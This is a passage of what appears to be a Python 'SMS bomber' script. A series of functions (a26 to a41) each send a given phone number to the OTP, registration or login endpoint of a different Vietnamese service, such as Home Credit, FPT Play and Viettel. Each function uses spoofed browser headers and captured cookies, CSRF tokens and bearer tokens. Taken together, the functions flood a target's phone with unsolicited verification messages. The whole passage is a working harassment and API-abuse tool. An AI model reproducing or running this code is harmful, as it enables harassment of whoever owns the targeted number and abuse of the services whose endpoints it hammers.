    '_xid': 'GI0Ie3qID8VUMZXwXBp4LMadvknzeVZvQGjLN233XJw%3D',
    '_ga_HQ2YVF8108': 'GS1.2.1692767920.1.1.1692768093.0.0.0',
    '_ga_9H7XV0QXGV': 'GS1.1.1692767920.1.1.1692768093.0.0.0',
    '_SI_SID_1.43672efc5d000118b53cfe67': 'ec890976f3a5645d2f41b6f8.1692768594885.326232',
    'TS01eb369c': '01798ff5ed492627bbdbf2744a5df9067ade28c5b1ebf0f8de63d50e763cfaa6d55d7f0d57aca9cb5128da7de02ae11165f84161cc',
    }
  headers = {
        'Accept': 'application/json',
    'Accept-Language': 'vi-VN,vi;q=0.9',
    'Access-Control-Allow-Origin': '*',
    'Authorization': 'Bearer 03ADUVZwCwosla2qGLouhsjaF363ixyj04Y6SenuquXO3msgII3g3bzUi8Pjn8XTs69T_pXR92qaLzX4QjTxCJgUf2nc6TMYKIsgidE5G4NpMPpDlCZ8XRmkjEgowKeaY_HavlYV9rdnsfmBSXYbM2zpWvg6a1MShm3cwFTGEggn6g3Gr-OoWBFKKSSCKZlZy3HGxcYJ2k6DlOGqhEJWnFf4iIks0hvGRaer7IY0WFHntAqMOGLBP31Eeu7t7QLSsi1VkKH6Odeye8eZtie7JlYOchksB6M5A-LzWrPVrUw1zh71OeztZ-Ecss63QDlJu4FatjtsGPbcRCGzn5QkE8hnI-YydlcmitF04igviSgb6Gkt5gbwCWKz6kwAOJUJQMS02l8YAZKJ0Dhx1oW3WpISWjqrazlVw0oK1MD2eFO8x7tSbaALXRMMfIFI304QdjnKdnkhvpdlg8uputPID9HHZuxtJKXQNeTm1OE117NaK5nFvCIs4ydIKqB5lq5YDjX0Ovc1gFKb4GPJ-CIwdfUJsO0EBm-mmqtuN_UcolykWHGoM4hx1F1V8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    # 'Cookie': 'lang=vi-VN; _gid=GA1.2.162175187.1692767917; _gcl_au=1.1.1392401524.1692767918; c=zMXcyX4X-1692767920021-3f46874aecdd11814596635; _ga=GA1.3.20410514.1692767917; _gid=GA1.3.162175187.1692767917; _gac_UA-55135171-7=1.1692767920.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE; MgidSensorUtmSource=google; MgidSensorClidV=0; _fbp=fb.1.1692767920777.185567813; _tt_enable_cookie=1; _ttp=eezki2H7q3-MigGjGivw9VHcKmT; _SI_VID_1.43672efc5d000118b53cfe67=21b15ab3630a453252c171e9; _SI_DID_1.43672efc5d000118b53cfe67=6343c55f-d611-3f08-850c-19d2aec3a9c9; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=aZY9EGoYugdC/DBk4FGNGyzSwbbr7lNgAO0pOT/Mzz4=; trackingId=prescore-3794d538-2e06-4f77-98a8-ad1cec99eea5; _gcl_aw=GCL.1692767985.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE; _gac_UA-166784548-1=1.1692767985.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE; _ga=GA1.2.20410514.1692767917; _gac_UA-55135171-7=1.1692767920.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE; _ga_HQ2YVF8108=GS1.3.1692767920.1.1.1692768080.0.0.0; MgidSensorNVis=6; MgidSensorHref=https://vaytienmat.homecredit.vn/bat-dau-vay; _fmdata=hn%2BAOPSKPYxJSzgnVZfTO1ymgXJSaRzSsKwMEjI%2BjTn7JFFh%2BLV1Oe62zGDhtY8LIURfbdxxsTalgm1WjGIJ0g%3D%3D; _xid=GI0Ie3qID8VUMZXwXBp4LMadvknzeVZvQGjLN233XJw%3D; _ga_HQ2YVF8108=GS1.2.1692767920.1.1.1692768093.0.0.0; _ga_9H7XV0QXGV=GS1.1.1692767920.1.1.1692768093.0.0.0; _SI_SID_1.43672efc5d000118b53cfe67=ec890976f3a5645d2f41b6f8.1692768594885.326232; TS01eb369c=01798ff5ed492627bbdbf2744a5df9067ade28c5b1ebf0f8de63d50e763cfaa6d55d7f0d57aca9cb5128da7de02ae11165f84161cc',
    'Origin': 'https://vaytienmat.homecredit.vn',
    'Referer': 'https://vaytienmat.homecredit.vn/vay-nhanh-uy-tin/xac-thuc-otp?utm_source=google&utm_medium=ecapp&utm_campaign=CLX_SEM_CLXALLSUBMIT_WEB_PRODUCT_ecapp&utm_content=none_text_adtext1_152829348882&utm_term=vay%20cmnd&tm=tt&ap=gads&aaid=adaY69ccjrA1J&gclid=EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'credentials': 'include',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
  params = {
    'utm_source': 'google',
    'utm_medium': 'ecapp',
    'utm_campaign': 'CLX_SEM_CLXALLSUBMIT_WEB_PRODUCT_ecapp',
    'utm_content': 'none_text_adtext1_152829348882',
    'utm_term': 'vay cmnd',
    'tm': 'tt',
    'ap': 'gads',
    'aaid': 'adaY69ccjrA1J',
    'gclid': 'EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE',
}
  json_data = {
    'phoneNumber': phone,
}

  response = requests.post(
    'https://vaytienmat.homecredit.vn/api/bod-generateOTP',
    params=params,
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def a26(phone):
    Headers = {"Host": "nhadat.cafeland.vn","content-length": "65","accept": "application/json, text/javascript, */*; q\u003d0.01","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://nhadat.cafeland.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://nhadat.cafeland.vn/dang-ky.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "laravel_session\u003deyJpdiI6IkhyUE8yblwvVFA1Um9KZnQ3K0syalZ3PT0iLCJ2YWx1ZSI6IlZkaG1mb3JpTUtsdjVOT3dSa0RNUFhWeDBsT21QWlcra2J5bFNzT1Q5RHdQYm83UVR4em1hNUNUN0ZFYTlIeUwiLCJtYWMiOiJiYzg4ZmU2ZWY3ZTFiMmM4MzE3NWVhYjFiZGUxMDYzNjRjZWE2MjkwYjcwOTdkMDdhMGU0OWI0MzJkNmFiOTg2In0%3D"}
    Payload = {"mobile": phone,"_token": "bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w",}
    response = requests.post("https://nhadat.cafeland.vn/member-send-otp/", data=Payload, headers=Headers)
###
def a27(phone):
  headers = {
    'authority':
    'api.dongplus.vn',
    'accept':
    '*/*',
    'accept-language':
    'vi',
    'content-type':
    'application/json',
    'origin':
    'https://dongplus.vn',
    'referer':
    'https://dongplus.vn/user/login',
    'sec-ch-ua':
    '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile':
    '?1',
    'sec-ch-ua-platform':
    '"Android"',
    'sec-fetch-dest':
    'empty',
    'sec-fetch-mode':
    'cors',
    'sec-fetch-site':
    'same-site',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'phone': phone,
  }
  requests.post('https://api.dongplus.vn/api/user/send-one-time-password',
                headers=headers,
                json=json_data)
###
def a28(phone):
    Headers = {"Host": "api.moneydong.vip","content-length": "72","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://h5.moneydong.vip","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://h5.moneydong.vip/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Payload = {"phone": phone[1:11], "type": "2", "ctype": "1", "chntoken": "69ad075c94c279e43608c5d50b77e8b9"}
    response = requests.post("https://api.moneydong.vip/h5/LoginMessage_ultimate", data=Payload, headers=Headers)
###
def a29(phone):
    Headers = {"Host": "api.gotadi.com","content-length": "44","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json","sec-ch-ua-platform": "\"Android\"","gtd-client-tracking-device-id": "85519cab-85d7-4881-abfa-65d2a2bb3a52","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","content-type": "application/json","origin": "https://www.gotadi.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.gotadi.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phoneNumber": phone,"language":"VI"})
    response = requests.post("https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp", data=Datason, headers=Headers)
###
def a30(phone):
    Headers = {"Host": "funring.vn","Connection": "keep-alive","Content-Length": "28","Accept": "*/*","User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","Content-Type": "application/json","Origin": "http://funring.vn","Referer": "http://funring.vn/module/register_mobile.jsp","Accept-Encoding": "gzip, deflate","Accept-Language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","Cookie": "JSESSIONID\u003dNODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; _ga\u003dGA1.2.1626827841.1679236846; _gid\u003dGA1.2.888694467.1679236846; _gat\u003d1"}
    Datason = json.dumps({"username": phone[1:11]})
    response = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp", data=Datason, headers=Headers)
###
def a31(phone):
  cookies = {
    'OnCredit_id': '643d8607c6ffe8.92935100',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef':
    'o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=',
    'SN5c8116d5e6183': 'rfsd6jmf1e0daeapvmv1p0i6bu',
  }

  headers = {
    'authority': 'oncredit.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'OnCredit_id=643d8607c6ffe8.92935100; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=; SN5c8116d5e6183=rfsd6jmf1e0daeapvmv1p0i6bu',
    'origin': 'https://oncredit.vn',
    'referer': 'https://oncredit.vn/registration',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'data[typeData]':
    'sendCodeReg',
    'data[phone]':
    phone,
    'data[email]':
    'tv5v4v4v4c@gmail.com',
    'data[captcha1]':
    '1',
    'data[lang]':
    'vi',
    'CSRFName':
    'CSRFGuard_ajax',
    'CSRFToken':
    't8ETz5Y5HFnBefT9dEnDBDe9S4D5RdyEFNKSFDn8b5YSFAB7yr5rD5QZ6b974ARi',
  }

  requests.post('https://oncredit.vn/?ajax',
                cookies=cookies,
                headers=headers,
                data=data)
###
def a32(phone):
    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers)
###
def a33(phone):
    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers)
###
def a34(phone):
    mail = random_string(6)
    Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
    Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers)
###
def a35(phone):
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)
###

def a36(phone):
  cookies = {
        '_ga': 'GA1.2.1651025600.1692762277',
  '_gid': 'GA1.2.215967924.1692762277',
  '_ga_9B0FYPSWN9': 'GS1.2.1692769369.2.0.1692769369.60.0.0',
  'serverChoice': 'Server-IPv2',
    }
  headers = {
        'authority': 'xuandungshortcuts.000webhostapp.com',
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'cache-control': 'max-age=0',
  'content-type': 'application/x-www-form-urlencoded',
  # 'cookie': '_ga=GA1.2.1651025600.1692762277; _gid=GA1.2.215967924.1692762277; _ga_9B0FYPSWN9=GS1.2.1692769369.2.0.1692769369.60.0.0; serverChoice=Server-IPv2',
  'origin': 'https://xuandungshortcuts.000webhostapp.com',
  'referer': 'https://xuandungshortcuts.000webhostapp.com/',
  'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'sec-fetch-dest': 'document',
  'sec-fetch-mode': 'navigate',
  'sec-fetch-site': 'same-origin',
  'sec-fetch-user': '?1',
  'upgrade-insecure-requests': '1',
  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}
  data = {
    'phone': phone,
  'ten_server': 'Server-IPv2',
  'key': 'modmobile',
}

  response = requests.post('https://xuandungshortcuts.000webhostapp.com/', cookies=cookies, headers=headers, data=data)
def a38(phone):
	home = requests.get('https://moca.vn/moca/v2/users/role', params=paramss, headers=headerss).json()
	token = home['data']['registrationId']
	response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headerss).json()
def a39(phone):
    cookies = {
        '_ym_uid': '1692727549534820669',
    '_ym_d': '1692727549',
    '_ym_isad': '2',
    '_ym_visorc': 'b',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'content-type': 'application/json; charset=utf-8',
    # 'cookie': '_ym_uid=1692727549534820669; _ym_d=1692727549; _ym_isad=2; _ym_visorc=b',
    'origin': 'https://vayvnd.vn',
    'referer': 'https://vayvnd.vn/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'site-id': '3',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'phone': phone,
    'utm': [
        {
            'utm_source': 'google',
            'utm_medium': 'organic',
            'referrer': 'https://www.google.com/',
        },
    ],
    'sourceSite': 3,

    }

    response = requests.post('https://api.vayvnd.vn/v2/users', cookies=cookies, headers=headers, json=json_data)
def a40(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
###
def a41(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
